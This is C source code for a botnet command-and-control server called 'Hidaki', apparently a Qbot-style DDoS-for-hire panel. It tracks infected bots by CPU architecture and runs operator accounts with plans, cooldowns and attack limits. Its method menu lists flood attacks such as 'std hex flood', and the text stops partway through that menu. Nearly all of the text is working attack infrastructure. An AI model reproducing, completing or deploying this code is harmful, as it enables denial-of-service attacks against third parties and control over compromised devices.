#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>

#define userfile "users/login.txt"
#define MAXFDS 1000000

char user_ip[100];
char *ipinfo[800];
char usethis[2048];
char motd[512];
int loggedin = 1;
int logoutshit;
int sent = 0;
int motdaction = 1;
int Attacksend = 0;
int AttackStatus = 0;
int userssentto;
int msgoff;
char broadcastmsg[800];
int attacksrunning = 0;
int threads, port;

struct login {
	char username[100];
	char password[100];
	char admin[50];
    char expirydate[100];
    int cooldown_timer;
    int cooldown;
    int maxtime;
		int maxattacks;
};
static struct login accounts[100];
struct clientdata_t {
	    uint32_t ip;
		char x86;
		char ARM;
		char mips;
		char mpsl;
		char ppc;
		char spc;
		char unknown;
		char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
    int adminstatus;
    char my_ip[100];
    char id[800];
    char planname[800];
    int mymaxtime;
    int mycooldown;
		int mymaxattacks;
    int listenattacks;
    int cooldownstatus;
    int cooldownsecs;
    int msgtoggle;
    int broadcasttoggle;
    int LoginListen;
} managements[MAXFDS];

struct Attacks {
	char username[100];
	char method[100];
	char ip[100];
	int attackcooldownsecs;
	int attacktime;
	int attacktimeleft;
	int amountofatks;

} Sending[MAXFDS];

struct args {
    int sock;
    struct sockaddr_in cli_addr;
};

struct CoolDownArgs{
    int sock;
    int seconds;
    char *ip;
    char *method;
    char *username;
};

struct toast {
    int login;
    int just_logged_in;
} gay[MAXFDS];


FILE *LogFile2;
FILE *LogFile3;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int DUPESDELETED = 0;

void StartCldown(void *arguments)
{
	struct CoolDownArgs *args = arguments;
	int fd = (int)args->sock;
	int seconds = (int)args->seconds;
	managements[fd].cooldownsecs = 0;
	time_t start = time(NULL);
	if(managements[fd].cooldownstatus == 0)
		managements[fd].cooldownstatus = 1;
	while(managements[fd].cooldownsecs++ <= seconds) sleep(1);
	managements[fd].cooldownsecs = 0;
	managements[fd].cooldownstatus = 0;
	return;
}

void attacktime(void *arguments)
{
	struct CoolDownArgs *args = arguments;
	int fd = args->sock;
	int seconds = args->seconds;

	attacksrunning++;
	time_t start = time(NULL);
	Sending[fd].amountofatks++;
	while(Sending[fd].attackcooldownsecs++ >= seconds) sleep(1);

	Sending[fd].attackcooldownsecs = 0;
	Sending[fd].amountofatks--;
	attacksrunning--;
	return;
}



void timeconnected(void *sock)
{
	char sadtimes[800];
	int datafd = (int)sock;
	int seconds = 7200;
	int closesecs = 0;
	while(seconds-- >= closesecs)
		{
			if(seconds == 1800)
			{
				sprintf(sadtimes, "\r\n\e[38;2;255;255;0mYou Have 30 Minutes Before You Will Be Logged Out!\r\n");
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
				sprintf(sadtimes, "\r\n\e[38;2;134;10;240m %s@Hidaki~# \e[0m", managements[datafd].id);
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
			}

			else if(seconds == 300)
			{
				sprintf(sadtimes, "\r\n\e[38;2;255;255;0mYou Have 5 Minutes Before You Will Be Logged Out!\r\n");
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
				sprintf(sadtimes, "\r\n\e[38;2;134;10;240m %s@Hidaki~# \e[0m", managements[datafd].id);
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
			}

			else if(seconds == 60)
			{
				sprintf(sadtimes, "\r\n\e[38;2;255;255;0mYou Have 60 Seconds Before You Will Be Logged Out!\r\n");
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
				sprintf(sadtimes, "\r\n\e[38;2;134;10;240m %s@Hidaki~# \e[0m", managements[datafd].id);
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
			}
			sleep(1);
		}
	char lz[800];
	sprintf(lz, "\r\n\e[38;2;255;255;0mYou Have Been Logged Out. You Have Had The Net Open For An Hour\r\n");
	memset(managements[datafd].id, 0, sizeof(managements[datafd].id));
	managements[datafd].connected = 0;
	OperatorsConnected--;
	send(datafd, lz, strlen(lz), MSG_NOSIGNAL);
	sleep(2);
	close(datafd);
	return;
}


void enc(char *str)
{
		int i;
		for(i = 0; (i < 100 && str[i] != '\0'); i++)
		str[i] = str[i] + 3;
}

void decrypt(char *str)
{
		int i;
		for(i = 0; (i < 100 && str[i] != '\0'); i++)
		{
			str[i] = str[i] - 3;
		}
}

char *apiip = "xmlapi.xyz/";
int resolvehttp(char *  , char *);
int resolvehttp(char *site , char *ip)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;
    if ( (he = gethostbyname( site ) ) == NULL)
    {
        herror("gethostbyname");
        return 1;
    }
    addr_list = (struct in_addr **) he->h_addr_list;
    for(i = 0; addr_list[i] != NULL; i++)
    {
        strcpy(ip , inet_ntoa(*addr_list[i]) );
        return 0;
    }
    return 1;
}





int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}

static int check_expiry(const int fd)
{
    time_t t = time(0);
    struct tm tm = *localtime(&t);
    int day, month, year, argc = 0;
    day = tm.tm_mday;
    month = tm.tm_mon + 1;
    year = tm.tm_year - 100;
    char *expirydate = calloc(strlen(accounts[fd].expirydate), sizeof(char));
    strcpy(expirydate, accounts[fd].expirydate);

    char *args[10 + 1];
    char *p2 = strtok(expirydate, "/");

    while(p2 && argc < 10)
    {
        args[argc++] = p2;
        p2 = strtok(0, "/");
    }

    if(year > atoi(args[2]) || day > atoi(args[1]) && month >= atoi(args[0]) && year == atoi(args[2]) || month > atoi(args[0]) && year >= atoi(args[2]))
        return 1;
    return 0;
}


int checkaccounts()
{
	FILE *file;
	if((file = fopen("users/login.txt","r")) != NULL)
	{
		fclose(file);
	} else {
		char checkaccuser[80], checkpass[80];
		printf("Username:");
		scanf("%s", checkaccuser);
		printf("Password:");
		scanf("%s", checkpass);
		char reguser[80];
		char thing[80];
		char mkdir[80];
		sprintf(mkdir, "mkdir users");
		sprintf(thing, "%s %s Admin 1200 0 9 99/99/9999");
		sprintf(reguser, "echo '%s' >> users/login.txt", thing);
		system(mkdir);
		system(reguser);
		printf("login.txt was Missing It has Now Been Created\r\nWithout this the screenw ould crash instantly\r\n");
	}
}
int checklog()
{
	FILE *logs1;
	if((logs1 = fopen("logs/", "r")) != NULL)
	{
		fclose(logs1);
	} else {
		char mkdir[80];
		strcpy(mkdir, "mkdir logs");
		system(mkdir);
		printf("Logs Directory Was Just Created\r\n");
	}
	FILE *logs2;
	if((logs2 = fopen("logs/IPBANNED.txt", "r")) != NULL)
	{
		fclose(logs2);
	} else {
		char makeipbanned[800];
		strcpy(makeipbanned, "cd logs; touch IPBANNED.txt");
		system(makeipbanned);
		printf("IPBANNED.txt Was Not In Logs... It has been created\r\nWithout This File The C2 would crash the instant you open it\r\n");
	}
	FILE *logs3;
	if((logs3 = fopen("logs/BANNEDUSERS.txt", "r")) != NULL)
	{
		fclose(logs3);
	} else {
		char makeuserbanned[800];
		strcpy(makeuserbanned, "cd logs; touch BANNEDUSERS.txt");
		system(makeuserbanned);
		printf("BANNEDUSERS.txt Was Not In Logs... It Has Been Created\r\nWithout This File The C2 would crash the instant you put your Username And Password In\r\n");
	}
	FILE *logs4;
	if((logs4 = fopen("logs/Blacklist.txt", "r")) != NULL)
	{
		fclose(logs4);
	} else {
		char makeblacklist[800];
		strcpy(makeblacklist, "cd logs; touch Blacklist.txt");
		system(makeblacklist);
		printf("Blacklist.txt Was Not In Logs... It Has Been Created\r\nWithout This File The C2 would crash the instant you Send An Attack\r\n");
	}

	FILE *logs5;
	if((logs5 = fopen("logs/AcceptedTos.txt", "r")) != NULL)
	{
		fclose(logs5);
	} else {
		char maketos[800];
		strcpy(maketos, "cd logs; touch AcceptedTos.txt");
		system(maketos);
	}

	FILE *logs6;
	if((logs6 = fopen("logs/LoggedUsers.txt", "r")) != NULL)
	{
		fclose(logs6);
	} else {
		char makelogd[800];
		strcpy(makelogd, "cd logs; touch LoggedUsers.txt");
		system(makelogd);
	}
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}

static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}

void broadcast(char *msg, int us, char *sender)
{
    int i;

    for(i = 0; i < MAXFDS; i++)
    {
        if(clients[i].connected >= 1)
        {
            send(i, msg, strlen(msg), MSG_NOSIGNAL);
            send(i, "\n", 1, MSG_NOSIGNAL);
        }
    }
}

void *BotEventLoop(void *useless)
{
	struct epoll_event event;
	struct epoll_event *events;
	int s;
	events = calloc(MAXFDS, sizeof event);
	while (1)
	{
		int n, i;
		n = epoll_wait(epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++)
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
			{
				clients[events[i].data.fd].connected = 0;
                clients[events[i].data.fd].x86 = 0;
                clients[events[i].data.fd].ARM = 0;
                clients[events[i].data.fd].mips = 0;
                clients[events[i].data.fd].mpsl = 0;
                clients[events[i].data.fd].ppc = 0;
                clients[events[i].data.fd].spc = 0;
                clients[events[i].data.fd].unknown = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd)
			{
				while (1)
				{
					struct sockaddr in_addr;
					socklen_t in_len;
					int infd, ipIndex;

					in_len = sizeof in_addr;
					infd = accept(listenFD, &in_addr, &in_len);
					if (infd == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
						else
						{
							perror("accept");
							break;
						}
					}

					clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

					int dup = 0;
					for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
					{
						if (!clients[ipIndex].connected || ipIndex == infd) continue;

						if (clients[ipIndex].ip == clients[infd].ip)
						{
							dup = 1;
							break;
						}
					}

						if(dup)
						{
							if(send(infd, "! DUP\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                		    close(infd);
                		    continue;
						}

					s = make_socket_non_blocking(infd);
					if (s == -1) { close(infd); break; }

					event.data.fd = infd;
					event.events = EPOLLIN | EPOLLET;
					s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
					if (s == -1)
					{
						perror("epoll_ctl");
						close(infd);
						break;
					}

					clients[infd].connected = 1;

				}
				continue;
			}
			else
			{
				int thefd = events[i].data.fd;
				struct clientdata_t *client = &(clients[thefd]);
				int done = 0;
				client->connected = 1;
		        client->x86 = 0;
		        client->ARM = 0;
		        client->mips = 0;
		        client->mpsl = 0;
		        client->ppc = 0;
		        client->spc = 0;
		        client->unknown = 0;
				while (1)
				{
					ssize_t count;
					char buf[2048];
					memset(buf, 0, sizeof buf);

					while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
					{
						if (strstr(buf, "\n") == NULL) { done = 1; break; }
						trim(buf);
						if (strcmp(buf, "PING") == 0) {
							if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
							continue;
						}

										        if(strstr(buf, "x86_64") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "x86_32") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "ARM4") == buf)
												{
													client->ARM = 1;
												}
												if(strstr(buf, "ARM5") == buf)
												{
													client->ARM = 1;
												}
												if(strstr(buf, "ARM6") == buf)
												{
													client->ARM = 1;
												}
												if(strstr(buf, "MIPS") == buf)
												{
													client->mips = 1;
												}
												if(strstr(buf, "MPSL") == buf)
												{
													client->mpsl = 1;
												}
												if(strstr(buf, "PPC") == buf)
												{
													client->ppc = 1;
												}
												if(strstr(buf, "SPC") == buf)
												{
													client->spc = 1;
												}
												if(strstr(buf, "idk") == buf)
												{
													client->unknown = 1;
												}

						if (strcmp(buf, "PONG") == 0) {
							continue;
						}
						printf("BOT:\"%s\"\n", buf);
					}

					if (count == -1)
					{
						if (errno != EAGAIN)
						{
							done = 1;
						}
						break;
					}
					else if (count == 0)
					{
						done = 1;
						break;
					}
				}

				if (done)
				{
					client->connected = 0;
		            client->x86 = 0;
		            client->ARM = 0;
		            client->mips = 0;
		            client->mpsl = 0;
		            client->ppc = 0;
		            client->spc = 0;
		            client->unknown = 0;
				  	close(thefd);
				}
			}
		}
	}
}


unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }

        return total;
}
unsigned int armConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ARM) continue;
                total++;
        }

        return total;
}
unsigned int mipsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }

        return total;
}
unsigned int mpslConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mpsl) continue;
                total++;
        }

        return total;
}
unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }

        return total;
}
unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }

        return total;
}
unsigned int unknownConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].unknown) continue;
                total++;
        }

        return total;
}


unsigned int botsconnect()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].connected) continue;
		total++;
	}

	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("users/login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}



void checkHostName(int hostname)
{
    if (hostname == -1)
    {
        perror("gethostname");
        exit(1);
    }
}
 void client_addr(struct sockaddr_in addr){

        sprintf(ipinfo, "%d.%d.%d.%d",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
    }

void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
		if(gay[datafd].login == 2)
		{
        	sprintf(string, "%c]0; Welcome To ⚡Hidaki, Please Login %c", '\033', '\007');
        } else {
        	if(managements[datafd].cooldownstatus == 1)
        	{
        		sprintf(string, "%c]0; ⚡HidakiNetworks >> Bot count: %d | Account: %s | Plan: %s | Attacks: %d | Cooldown: %d %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, attacksrunning, managements[datafd].mycooldown - managements[datafd].cooldownsecs, '\007');
        	}
        	else if(managements[datafd].cooldownstatus == 0)
        	{
        		sprintf(string, "%c]0; ⚡HidakiNetworks >> Bot count: %d | Account: %s | Plan: %s | Attacks: %d %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, attacksrunning, '\007');
        	}
        }
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}


void *BotWorker(void *sock)
{
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    gay[datafd].login = 2;
    pthread_create(&title, NULL, &TitleWriter, sock);
    char buf[2048];
	char* username;
	char* password;
	char* admin = "admin";
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("users/login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s %s %d %d %d %s", accounts[j].username, accounts[j].password, accounts[j].admin, &accounts[j].maxtime, &accounts[j].cooldown, &accounts[j].maxattacks, accounts[j].expirydate);
		++j;

	}

		char *line1 = NULL;
        size_t n1 = 0;
        FILE *f1 = fopen("logs/IPBANNED.txt", "r");
            while (getline(&line1, &n1, f1) != -1){
                if (strstr(line1, ipinfo) != NULL){
                    sprintf(botnet, "\e[38;5;190mYour IP was banned! Write t.me/shittzukka!\r\n");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    sleep(5);
                    goto end;
            }
        }
        fclose(f1);
        free(line1);


		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[2J\033[1;1H");
        {
		char username [5000];
        sprintf(username, "\e[38;2;129;8;240mUsername\e[38;2;229;223;232m: ", accounts[find_line].username);
		if(send(datafd, username, strlen(username), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);

        char nickstring[30];
        strcpy(nickstring, buf);
	    memset(buf, 0, sizeof(buf));
	    find_line = Find_Login(nickstring);
        memset(buf, 0, 2048);

		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;

		char password [5000];
        sprintf(password, "\e[38;2;129;8;240mPassword\e[0m: \e[38;2;21;21;21m", accounts[find_line].password);

		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        char passwordl[800];
        trim(buf);
        strcpy(passwordl, buf);
        memset(buf, 0, 2048);

		char *line2 = NULL;
        size_t n2 = 0;
        FILE *f2 = fopen("logs/BANNEDUSERS.txt", "r");
            while (getline(&line2, &n2, f2) != -1){
                if (strstr(line2, nickstring) != NULL){
                    if(send(datafd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
                    sprintf(usethis, "\e[38;5;190mYou was banned! Write t.me/shittzukka!\r\n");
                    if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) return;
                    sleep(5);
                    goto end;
            }
        }
        fclose(f2);
        free(line2);

        if(strcmp(accounts[find_line].username, nickstring) != 0 || strcmp(accounts[find_line].password, passwordl) != 0){ goto failed;}
        if(strcmp(accounts[find_line].username, nickstring) == 0 || strcmp(accounts[find_line].password, passwordl) == 0)
        {
        	int toast;
        	for(toast=0;toast < MAXFDS;toast++){
            	if(!strcmp(managements[toast].id, nickstring))
            	{
            		char bad[800];
            		sprintf(bad, "\e[38;5;190mUser %s Is already Logged in Dipshit\r\n", nickstring);
            		if(send(datafd, bad, strlen(bad), MSG_NOSIGNAL) == -1) goto end;

            		sprintf(usethis, "\r\n\e[38;5;190mMessage From Hidaki C2:\r\nSomeone Tried To Login To Your Account Contact An Admin\r\n");
            		if(send(toast, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;

            		sprintf(usethis, "\r\n\e[38;2;134;10;240m %s@Hidaki~# \e[0m", nickstring);
            		if(send(toast, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;

            		memset(nickstring, 0, sizeof(nickstring));
            		memset(passwordl, 0, sizeof(passwordl));
            		sleep(5);
            		goto end;
            	}
        	}


        	if(!strcasecmp(accounts[find_line].admin, "api"))
        	{
        		goto Banner;
        	}
        	char gya[800];

        	sprintf(gya, "\033[2J\033[1;1H");
        	if(send(datafd, gya, strlen(gya), MSG_NOSIGNAL) == -1) goto end;

        	goto Banner;

            }
        }

            failed:
			if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
			sprintf(usethis, "\e[38;5;190mYou Have Failed Your Login Please Try Again...\r\n");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			sleep(3);
        	goto end;

        Banner:

        strcpy(accounts[datafd].expirydate, accounts[find_line].expirydate);
        if(check_expiry(datafd) == 1)
        {
            sprintf(clearscreen, "\033[2J\033[1;1H");
            if(send(datafd, clearscreen,  strlen(clearscreen),    MSG_NOSIGNAL) == -1) goto end;
            send(datafd, "\e[38;5;190mAccount Has Expired, Message Admin For Renewal!\r\n", strlen("\e[38;5;190mAccount Has Expired, Message Admin For Renewal!\r\n"), MSG_NOSIGNAL); // now
            printf("[Hidaki]:%s's Account Has Expired\r\n", accounts[find_line].username);
            sleep(5);
            goto end;
        }
        gay[datafd].login = 0;
        pthread_t timeloggedin;
		pthread_create(&title, NULL, &TitleWriter, sock);
		        char banner0   [2400];
		        char banner1   [2400];
		        char banner2   [2400];
		        char banner3   [2400];
		        char banner4   [2400];
		        char banner5   [2400];
		        char *userlog  [1200];

 				char hostbuffer[256];
    			int hostname;
    			hostname = gethostname(hostbuffer, sizeof(hostbuffer));
    			checkHostName(hostname);
 				if(!strcmp(accounts[find_line].admin, "admin"))
 				{
 					managements[datafd].adminstatus = 1;
 				} else {
 					pthread_create(&timeloggedin, NULL, &timeconnected, sock);
 				}

                char clearscreen1 [2048];
				memset(clearscreen1, 0, 2048);
				sprintf(clearscreen1, "\033[2J\033[1;1H");
				sprintf(managements[datafd].my_ip, "%s", ipinfo);
				sprintf(managements[datafd].id, "%s", accounts[find_line].username);
				sprintf(managements[datafd].planname, "%s", accounts[find_line].admin);
				managements[datafd].mycooldown = accounts[find_line].cooldown;
				managements[datafd].mymaxtime = accounts[find_line].maxtime;
				managements[datafd].mymaxattacks = accounts[find_line].maxattacks;

				int loginshit;
				for(loginshit=0;loginshit<MAXFDS;loginshit++)
				{
					if(gay[datafd].just_logged_in == 0 && managements[loginshit].LoginListen == 1 && managements[loginshit].connected == 1 && loggedin == 0)
					{
						sprintf(usethis, "\r\n%s Plan: [%s] Just Logged In!\r\n", managements[datafd].id, managements[datafd].planname);
						printf(usethis, "[Hidaki]:%s Plan: [%s] Just Logged In!\r\n", managements[datafd].id, managements[datafd].planname);
						if(send(loginshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						sprintf(usethis, "\e[38;2;134;10;240m %s@Hidaki~# \e[0m", managements[loginshit].id);
						if(send(loginshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						gay[datafd].just_logged_in = 3;
					}
				}
				memset(ipinfo, 0, sizeof(ipinfo));

				sprintf(banner0,  "\r\n\r\n                        \e[38;2;154;18;239m ▄ .▄▪  ·▄▄▄▄   ▄▄▄· ▄ •▄ ▪  \r\n");
				sprintf(banner1,  "                        \e[38;2;149;16;239m██▪▐███ ██▪ ██ ▐█ ▀█ █▌▄▌▪██ \r\n");
				sprintf(banner2,  "                        \e[38;2;144;14;239m██▀▐█▐█·▐█· ▐█▌▄█▀▀█ ▐▀▀▄·▐█·\r\n");
				sprintf(banner3,  "                        \e[38;2;139;12;240m██▌▐▀▐█▌██. ██ ▐█ ▪▐▌▐█.█▌▐█▌\r\n");
				sprintf(banner4,  "                        \e[38;2;134;10;240m▀▀▀ ·▀▀▀▀▀▀▀▀•  ▀  ▀ ·▀  ▀▀▀▀\r\n");
				sprintf(banner5, "                        \e[38;2;129;8;240m           Welcome to \e[38;2;255;255;0m⚡\e[38;2;129;8;240mHidaki\r\n", accounts[find_line].username);
				if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;



		while(1) {
		char input [5000];
        sprintf(input, "\r\n\e[38;2;134;10;240m %s@Hidaki~# \e[0m", managements[datafd].id);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {

      		if(strcasestr(buf, "help") || strcasestr(buf, "info"))
      		{
					pthread_create(&title, NULL, &TitleWriter, sock);
	  				send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
            if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;

					char help1  [800];
					char help2  [800];
					char help3  [800];
					char help4  [800];
					sprintf(help1,   "\r\n   \e[38;2;119;34;192m> \e[38;2;211;181;236mMethods    \e[38;2;119;34;192m##Shows Methods\r\n");
    			    sprintf(help2,   "   \e[38;2;119;34;192m> \e[38;2;211;181;236mBots       \e[38;2;119;34;192m##Shows Bot Count\r\n");
    			    sprintf(help3,   "   \e[38;2;119;34;192m> \e[38;2;211;181;236mAccount    \e[38;2;119;34;192m##Shows Your Account Info\r\n");
        	        sprintf(help4,   "   \e[38;2;119;34;192m> \e[38;2;211;181;236mCls        \e[38;2;119;34;192m##Clears Screen\r\n");

					if(send(datafd, help1,  strlen(help1),  MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, help2,  strlen(help2),  MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, help3,  strlen(help3),  MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, help4,  strlen(help4),  MSG_NOSIGNAL) == -1) goto end;
					pthread_create(&title, NULL, &TitleWriter, sock);
					char input [5000];
        			sprintf(input, "\r\n\e[38;2;134;10;240m %s@Hidaki~#  \e[0m", accounts[find_line].username);
					if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto Banner;
							continue;
 			}

 			if(strcasestr(buf, "testing"))
 			{
 				int i;
 				for(i=0;i < attacksrunning;i++){
 					sprintf(usethis, "%s: %s IP: %s Port: %s Time: %d Time Left: %s", Sending[i].username, Sending[i].method, Sending[i].ip, Sending[i].attacktime, Sending[i].attacktimeleft);
 					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 				}
 			}

 			if(strcasestr(buf, "method"))
 			{
				pthread_create(&title, NULL, &TitleWriter, sock);
	    	    send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
            if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;
	    	    if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	    	    if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	    	    if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end;
	    	    if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	    	    if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;

	  			char attack0  [800];
				char attack1  [800];
				char attack2  [800];
				char attack3  [800];
				char attack4  [800];
				char attack5  [800];
				char disabled1[800];

        	    sprintf(attack0,   "\r\n   \e[38;2;119;34;192m> \e[38;2;211;181;236m!* std <target ip> <port> <time>      \e[38;2;119;34;192m## std hex flood\r\n");
				sprintf(attack1,   "   \e[38;2;119;34;192m> \e[38;2;211;181;236m!* randhex <target ip> <port> <time>  \e[38;2;119;34;192m## random hex string flood\r\n");
